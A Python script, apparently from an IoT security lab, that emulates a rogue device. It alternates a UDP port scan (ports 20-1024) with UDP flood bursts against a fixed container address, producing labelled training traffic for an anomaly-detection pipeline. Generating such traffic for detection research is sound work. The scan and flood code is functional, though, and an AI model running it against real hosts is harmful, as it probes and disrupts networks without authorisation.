#!/usr/bin/env python3
"""Simulated rogue-device attack traffic generator.

This module emulates a malicious IoT device that performs two
distinct attack patterns against the camera node (172.20.0.10):

1. **Port scan** - rapidly probes ports 20-1024 with small UDP
   packets to discover open services.
2. **UDP flood** - blasts large random-data bursts at random ports
   to saturate the target's network stack.

Both patterns run in an alternating loop so the resulting traffic is
clearly distinguishable from normal IoT behaviour, making it ideal
training data for the anomaly-detection pipeline.

Designed to run inside a Docker container on the ``iot_network``
bridge (172.20.0.0/24).  The container **must** have the
``NET_ADMIN`` capability (granted via ``docker-compose.yml``).
"""

import os
import random
import sys
import time

from scapy.all import IP, UDP, Raw, send  # type: ignore[import-untyped]

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
TARGET_IP: str = "172.20.0.10"

# Port-scan parameters
SCAN_PORT_START: int = 20
SCAN_PORT_END: int = 1024
SCAN_PROBE_SIZE: int = 4  # tiny probe packet
SCAN_DELAY_SECONDS: float = 0.1

# UDP-flood parameters
FLOOD_BURST_COUNT: int = 50
FLOOD_MIN_PAYLOAD: int = 512
FLOOD_MAX_PAYLOAD: int = 1400
FLOOD_DELAY_SECONDS: float = 0.05

# Pause between full attack cycles (scan → flood → pause)
CYCLE_PAUSE_SECONDS: float = 5.0


def port_scan(target: str, start_port: int, end_port: int) -> None:
    """Perform a sequential UDP port scan against *target*.

    A small probe packet is sent to every port in the range
    [*start_port*, *end_port*] with a short delay between each
    probe.

    Args:
        target: IPv4 address of the scan target.
        start_port: First port number to probe (inclusive).
        end_port: Last port number to probe (inclusive).
    """
    print(
        f"[ROGUE] Starting port scan on {target} "
        f"ports {start_port}-{end_port}",
        flush=True,
    )

    for port in range(start_port, end_port + 1):
        probe_payload = os.urandom(SCAN_PROBE_SIZE)
        packet = (
            IP(dst=target)
            / UDP(dport=port)
            / Raw(load=probe_payload)
        )
        try:
            send(packet, verbose=False)
            print(
                f"[ROGUE][SCAN] Probed {target}:{port}  "
                f"({SCAN_PROBE_SIZE} bytes)",
                flush=True,
            )
        except PermissionError as exc:
            print(
                f"[ROGUE][SCAN][ERROR] Permission denied on port {port}: {exc}",
                file=sys.stderr,
                flush=True,
            )
        except OSError as exc:
            print(
                f"[ROGUE][SCAN][ERROR] OS/network error on port {port}: {exc}",
                file=sys.stderr,
                flush=True,
            )
        except Exception as exc:  # noqa: BLE001
            print(
                f"[ROGUE][SCAN][ERROR] Unexpected error on port {port}: {exc}",
                file=sys.stderr,
                flush=True,
            )

        try:
            time.sleep(SCAN_DELAY_SECONDS)
        except KeyboardInterrupt:
            raise

    print(
        f"[ROGUE] Port scan complete ({end_port - start_port + 1} ports probed)",
        flush=True,
    )


def udp_flood(target: str, burst_count: int) -> None:
    """Send a burst of large UDP packets to random ports on *target*.

    Each packet carries a random payload whose size is drawn uniformly
    from [``FLOOD_MIN_PAYLOAD``, ``FLOOD_MAX_PAYLOAD``].

    Args:
        target: IPv4 address of the flood target.
        burst_count: Number of packets to send in this burst.
    """
    print(
        f"[ROGUE] Starting UDP flood on {target}  "
        f"burst_count={burst_count}",
        flush=True,
    )

    for i in range(1, burst_count + 1):
        dst_port = random.randint(1, 65535)
        payload_size = random.randint(FLOOD_MIN_PAYLOAD, FLOOD_MAX_PAYLOAD)
        payload = os.urandom(payload_size)

        packet = (
            IP(dst=target)
            / UDP(dport=dst_port)
            / Raw(load=payload)
        )

        try:
            send(packet, verbose=False)
            print(
                f"[ROGUE][FLOOD] Packet {i}/{burst_count} -> "
                f"{target}:{dst_port}  ({payload_size} bytes)",
                flush=True,
            )
        except PermissionError as exc:
            print(
                f"[ROGUE][FLOOD][ERROR] Permission denied: {exc}",
                file=sys.stderr,
                flush=True,
            )
        except OSError as exc:
            print(
                f"[ROGUE][FLOOD][ERROR] OS/network error: {exc}",
                file=sys.stderr,
                flush=True,
            )
        except Exception as exc:  # noqa: BLE001
            print(
                f"[ROGUE][FLOOD][ERROR] Unexpected error: {exc}",
                file=sys.stderr,
                flush=True,
            )

        try:
            time.sleep(FLOOD_DELAY_SECONDS)
        except KeyboardInterrupt:
            raise

    print(
        f"[ROGUE] UDP flood burst complete ({burst_count} packets sent)",
        flush=True,
    )


def main() -> None:
    """Entry-point: alternate between port scanning and UDP flooding.

    Each cycle consists of:
      1. A full port scan of ports 20–1024.
      2. A burst of ``FLOOD_BURST_COUNT`` large UDP flood packets.
      3. A brief pause before the next cycle.

    The loop runs indefinitely and catches ``KeyboardInterrupt`` for
    graceful shutdown.
    """
    print(
        f"[ROGUE] Rogue device attack module initialised  "
        f"target={TARGET_IP}  "
        f"scan_ports={SCAN_PORT_START}-{SCAN_PORT_END}  "
        f"flood_burst={FLOOD_BURST_COUNT}",
        flush=True,
    )

    cycle = 0
    try:
        while True:
            cycle += 1
            print(
                f"\n[ROGUE] ===== Attack cycle {cycle} =====",
                flush=True,
            )

            # Phase 1 - port scan
            port_scan(TARGET_IP, SCAN_PORT_START, SCAN_PORT_END)

            # Phase 2 - UDP flood burst
            udp_flood(TARGET_IP, FLOOD_BURST_COUNT)

            # Brief cooldown before next cycle
            print(
                f"[ROGUE] Cycle {cycle} finished. "
                f"Pausing {CYCLE_PAUSE_SECONDS}s before next cycle...",
                flush=True,
            )
            time.sleep(CYCLE_PAUSE_SECONDS)

    except KeyboardInterrupt:
        print("\n[ROGUE] Shutting down gracefully.", flush=True)
    except Exception as exc:  # noqa: BLE001
        print(
            f"[ROGUE][FATAL] Unrecoverable error in main loop: {exc}",
            file=sys.stderr,
            flush=True,
        )
        sys.exit(1)


if __name__ == "__main__":
    main()
